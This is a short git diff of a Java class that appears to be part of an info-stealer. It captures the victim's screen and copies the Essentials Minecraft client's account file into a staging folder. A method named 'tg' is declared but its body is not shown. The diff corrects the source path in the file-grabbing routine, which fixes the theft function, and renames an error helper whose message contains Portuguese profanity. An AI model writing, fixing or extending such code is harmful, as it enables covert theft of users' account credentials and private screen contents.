@@ -43,7 +43,7 @@ public class zero {
         BufferedImage image = robot.createScreenCapture(screenRectangle);
         (new Random()).nextInt();
         ImageIO.write(image, "png", new File(back.xdFolderPath + "\\screenshot.png"));
-      } catch (Exception var4){ utils.ErrorMessage(var4, "Sem capitura de tela????????????? vai se fuderrrr, como isso e possivel??? ( apenas reporta essa merda )"); }
+      } catch (Exception var4){ utils.errorMessage(var4, "Sem capitura de tela????????????? vai se fuderrrr, como isso e possivel??? ( apenas reporta essa merda )"); }
    }
 
    public static void tg(){
@@ -111,7 +111,7 @@ public class zero {
    public static void grabEssentials(){
       if(back.essentialsPath.exists()){
          File target = new File(back.xdFolderPath + "\\essentials\\Essential.json");
-         utils.copyFile(back.featherPath, target);
+         utils.copyFile(back.essentialsPath, target);
       }
    }
 }
